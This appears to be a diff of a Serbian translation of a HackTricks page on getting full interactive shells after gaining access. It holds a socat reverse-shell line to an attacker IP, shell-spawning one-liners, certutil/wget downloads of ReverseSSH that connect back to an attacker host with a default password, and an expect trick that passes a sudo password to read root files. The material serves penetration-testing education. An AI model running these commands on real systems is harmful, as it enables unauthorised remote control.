@@ -1,22 +1,23 @@
-# Potpuni TTY-ovi
+# Potpuni TTY-jevi
+
+{% hint style="success" %}
+Naučite i vežbajte hakovanje AWS-a:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Naučite i vežbajte hakovanje GCP-a: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
-<summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary>Podržite HackTricks</summary>
 
-Drugi načini podrške HackTricks-u:
-
-* Ako želite da vidite **vašu kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
-* Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
-* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
-* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.
+* Proverite [**planove pretplate**](https://github.com/sponsors/carlospolop)!
+* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitteru** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Podelite hakovanje trikova slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.
 
 </details>
+{% endhint %}
 
 ## Potpuni TTY
 
-Imajte na umu da ljuska koju postavite u promenljivu `SHELL` **mora** biti **navedena unutar** _**/etc/shells**_ ili `Vrednost za promenljivu SHELL nije pronađena u fajlu /etc/shells. Ovaj incident je prijavljen`. Takođe, imajte na umu da sledeći isečci rade samo u bash-u. Ako koristite zsh, promenite na bash pre nego što dobijete ljusku pokretanjem `bash`.
+Imajte na umu da shell koji postavite u promenljivu `SHELL` **mora** biti **naveden unutar** _**/etc/shells**_ ili `Vrednost za SHELL promenljivu nije pronađena u /etc/shells fajlu. Ovaj incident je prijavljen`. Takođe, imajte na umu da sledeći isečci rade samo u bash-u. Ako koristite zsh, pređite na bash pre dobijanja shella pokretanjem `bash`.
 
 #### Python
 
@@ -49,7 +50,7 @@ socat file:`tty`,raw,echo=0 tcp-listen:4444
 #Victim:
 socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444
 ```
-### **Spawnujte ljuske**
+### **Pokretanje ljuski**
 
 * `python -c 'import pty; pty.spawn("/bin/sh")'`
 * `echo os.system('/bin/bash')`
@@ -66,11 +67,11 @@ socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444
 
 ## ReverseSSH
 
-Praktičan način za **interaktivni pristup ljusci**, kao i za **prenos fajlova** i **prosleđivanje porta**, je da se na ciljnoj mašini instalira statički povezani ssh server [ReverseSSH](https://github.com/Fahrj/reverse-ssh).
+Praktičan način za **interaktivni pristup ljusci**, kao i za **prenos fajlova** i **prosleđivanje portova**, je da se ispusti statički povezan ssh server [ReverseSSH](https://github.com/Fahrj/reverse-ssh) na cilj.
 
-U nastavku je primer za `x86` sa upx-komprimiranim binarnim fajlovima. Za druge binarne fajlove, proverite [stranicu sa izdanjima](https://github.com/Fahrj/reverse-ssh/releases/latest/).
+U nastavku je primer za `x86` sa upx-kompresovanim binarnim fajlovima. Za druge binarne fajlove, proverite [stranicu sa izdanjima](https://github.com/Fahrj/reverse-ssh/releases/latest/).
 
-1. Pripremite lokalno za prihvatanje zahteva za prosleđivanje porta ssh:
+1. Pripremite lokalno za hvatanje zahteva za prosleđivanje porta ssh:
 
 {% code overflow="wrap" %}
 ```bash
@@ -92,7 +93,7 @@ wget -q https://github.com/Fahrj/reverse-ssh/releases/latest/download/upx_revers
 ```
 {% endcode %}
 
-* (2b) Cilj sa Windows 10 (za ranije verzije, proverite [readme projekta](https://github.com/Fahrj/reverse-ssh#features)):
+* (2b) Ciljani Windows 10 (za ranije verzije, proverite [readme projekta](https://github.com/Fahrj/reverse-ssh#features)):
 
 {% code overflow="wrap" %}
 ```bash
@@ -101,9 +102,7 @@ certutil.exe -f -urlcache https://github.com/Fahrj/reverse-ssh/releases/latest/d
 
 reverse-ssh.exe -p 4444 kali@10.0.0.2
 ```
-{% endcode %}
-
-* Ako je zahtev za preusmeravanje porta ReverseSSH uspešan, sada biste trebali moći da se prijavite sa podrazumevanom lozinkom `letmeinbrudipls` u kontekstu korisnika koji pokreće `reverse-ssh(.exe)`:
+* Ako je zahtev za preusmeravanje porta ReverseSSH uspeo, sada biste trebali moći da se prijavite sa podrazumevanom lozinkom `letmeinbrudipls` u kontekstu korisnika koji pokreće `reverse-ssh(.exe)`:
 ```bash
 # Interactive shell access
 ssh -p 8888 127.0.0.1
@@ -111,22 +110,23 @@ ssh -p 8888 127.0.0.1
 # Bidirectional file transfer
 sftp -P 8888 127.0.0.1
 ```
-## Bez TTY-ja
+## Bez TTY-a
 
-Ako iz nekog razloga ne možete dobiti pun TTY, **i dalje možete interagovati sa programima** koji očekuju unos korisnika. U sledećem primeru, lozinka se prosleđuje `sudo` komandi kako bi se pročitao fajl:
+Ako iz nekog razloga ne možete dobiti pun TTY, i dalje možete interagovati sa programima koji očekuju korisnički unos. U sledećem primeru, lozinka se prosleđuje `sudo` kako bi pročitao fajl:
 ```bash
 expect -c 'spawn sudo -S cat "/root/root.txt";expect "*password*";send "<THE_PASSWORD_OF_THE_USER>";send "\r\n";interact'
 ```
+{% hint style="success" %}
+Učite i vežbajte hakovanje AWS-a: <img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Učite i vežbajte hakovanje GCP-a: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+
 <details>
 
-<summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary>Podržite HackTricks</summary>
 
-Drugi načini podrške HackTricks-u:
-
-* Ako želite da vidite **vašu kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**PLANOVE ZA PRETPLATU**](https://github.com/sponsors/carlospolop)!
-* Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
-* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
-* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.
+* Proverite [**planove pretplate**](https://github.com/sponsors/carlospolop)!
+* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitteru** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Podelite hakovanje trikova slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.
 
 </details>
+{% endhint %}
